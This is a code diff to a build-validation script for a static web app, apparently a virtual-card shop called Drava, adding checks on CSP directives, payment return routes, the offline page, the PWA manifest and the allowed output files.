+if (!/Une fois votre compte créé et vérifié/.test(receiptSource) || !/envoyez-nous l’adresse e-mail associée par Telegram en priorité, ou par WhatsApp/.test(receiptSource) || !/Nous procéderons alors à l’ajout de la carte dans votre compte/.test(receiptSource)) failures.push('Receipt must explain the separate manual card fulfillment steps')
 const workerSource = await readRequired(workerSourcePath)
-if (workerSource) failures.push(...validateWorkerSource(workerSource))
+// The Worker is reviewed across router, engine, services, providers and fulfillment modules.
+const commonSources = Object.fromEntries(await Promise.all(commonPaymentPaths.map(async relativePath => [relativePath, await readRequired(relativePath)])))
+failures.push(...validateCommonPaymentArchitecture(commonSources))
 const workerConfig = await readRequired(workerConfigPath)
 if (workerConfig) failures.push(...validateWorkerConfig(workerConfig))
 const workerPackage = await readRequired('worker/package.json')
 if (workerPackage) failures.push(...validateWorkerPackage(workerPackage))
 
 const layoutSource = await readRequired('src/app/layout.tsx')
+const offlineSource = await readRequired('public/offline.html')
+if (offlineSource) failures.push(...validateOfflineDocument(offlineSource))
 if (layoutSource) {
   const requiredCspDirectives = [
     "script-src 'self' 'unsafe-inline'",
     "style-src 'self' 'unsafe-inline'",
+    "img-src 'self' data: https://img.youtube.com",
     `connect-src 'self' ${proxyOrigin}`,
     "form-action 'none'",
-    "frame-src 'none'",
+    "frame-src https://www.youtube.com",
   ]
   for (const directive of requiredCspDirectives) {
     if (!layoutSource.includes(`"${directive}"`)) failures.push(`Required CSP directive is missing or broadened: ${directive}`)
@@ -1510,6 +1892,8 @@ for (const [routePath, expectedStatus] of [
   if (!new RegExp(`status=["']${expectedStatus}["']`).test(source)) failures.push(`Technical route has wrong result status: ${routePath}`)
   if (!/index\s*:\s*false/.test(source)) failures.push(`Technical payment route must be noindex: ${routePath}`)
 }
+const tiktokRouteSource = await readRequired(tiktokRoutePath)
+if (tiktokRouteSource && (!/index\s*:\s*false/.test(tiktokRouteSource) || !/follow\s*:\s*false/.test(tiktokRouteSource))) failures.push('TikTok payment return must remain noindex and nofollow')
 
 let outputFileCount = 0
 if (requireOutput) {
@@ -1531,6 +1915,8 @@ if (requireOutput) {
         if (rule.pattern.test(source)) failures.push(`${rule.label} in production output: ${relativePath}`)
       }
       for (const rule of forbiddenOutputPatterns) {
+        if (rule.label === 'payment iframe' && isReviewedPdfIframeRuntime(source, relativePath)) continue
+        if (rule.label === 'legacy XAF currency' && /^out\/_next\/static\/chunks\/[^/]+\.js$/.test(relativePath) && allowReviewedPaymentCurrency(source)) continue
         if (rule.pattern.test(source)) failures.push(`${rule.label}: ${relativePath}`)
       }
       failures.push(...validateFrontendUrls(source, relativePath, true))
@@ -1556,6 +1942,7 @@ if (requireOutput) {
     } else {
       const manifest = JSON.parse(await readFile(manifestPath, 'utf8'))
       const icons = Array.isArray(manifest.icons) ? manifest.icons : []
+      if (manifest.name !== 'Drava' || manifest.short_name !== 'Drava' || manifest.display !== 'standalone') failures.push('PWA must install as Drava in standalone mode')
       const paths = [manifest.id, manifest.start_url, manifest.scope, ...icons.map((icon) => icon.src)]
       if (icons.length === 0 || paths.some((value) => typeof value !== 'string' || value.startsWith('/'))) {
         failures.push('Web app manifest paths must remain relative')
@@ -1569,14 +1956,16 @@ if (requireOutput) {
       if (!rootHtml.includes('http-equiv="Content-Security-Policy"')) failures.push('CSP meta tag missing from production output')
       const encodedCspDirectives = [
         "script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;",
+        "img-src &#x27;self&#x27; data: https://img.youtube.com;",
         `connect-src &#x27;self&#x27; ${proxyOrigin};`,
         "form-action &#x27;none&#x27;;",
-        "frame-src &#x27;none&#x27;;",
+        "frame-src https://www.youtube.com;",
       ]
       for (const directive of encodedCspDirectives) {
         if (!rootHtml.includes(directive)) failures.push(`Production CSP directive is missing or broadened: ${directive}`)
       }
       if (!rootHtml.includes(`${expectedBasePath}/register-sw.js`)) failures.push('Service-worker registration escapes the Pages base path')
+      if (!rootHtml.includes(`${expectedBasePath}/pwa-install-capture.js`)) failures.push('PWA install capture escapes the deployment base path')
       if (!rootHtml.includes('Cartes virtuelles DRAVA')) failures.push('Card catalogue is missing from production root')
       if (process.env.NEXT_PUBLIC_SITE_URL) {
         const siteUrl = new URL(process.env.NEXT_PUBLIC_SITE_URL)
@@ -1589,12 +1978,13 @@ if (requireOutput) {
       const candidates = [`out/${route}.html`, `out/${route}/index.html`]
       if ((await Promise.all(candidates.map(pathExists))).some(Boolean)) failures.push(`Removed route is present in output: /${route}`)
     }
-    for (const route of ['payment-success', 'payment-failure']) {
+    for (const route of ['payment-success', 'payment-failure', 'tiktok-payment']) {
       const candidates = [`out/${route}.html`, `out/${route}/index.html`]
       if (!(await Promise.all(candidates.map(pathExists))).some(Boolean)) failures.push(`Required technical route is missing from output: /${route}`)
     }
 
     const allowedHtmlPaths = new Set([
+      'offline.html',
       '404.html',
       '404/index.html',
       'index.html',
@@ -1602,7 +1992,11 @@ if (requireOutput) {
       'payment-success/index.html',
       'payment-failure.html',
       'payment-failure/index.html',
+      'tiktok-payment.html',
+      'tiktok-payment/index.html',
     ])
+    const exportedOffline = await readRequired('out/offline.html')
+    if (!exportedOffline || exportedOffline !== offlineSource) failures.push('Export must contain the reviewed public offline document')
     for (const file of outputFiles) {
       if (path.extname(file) !== '.html') continue
       const relativePath = path.relative(outputRoot, file).split(path.sep).join('/')
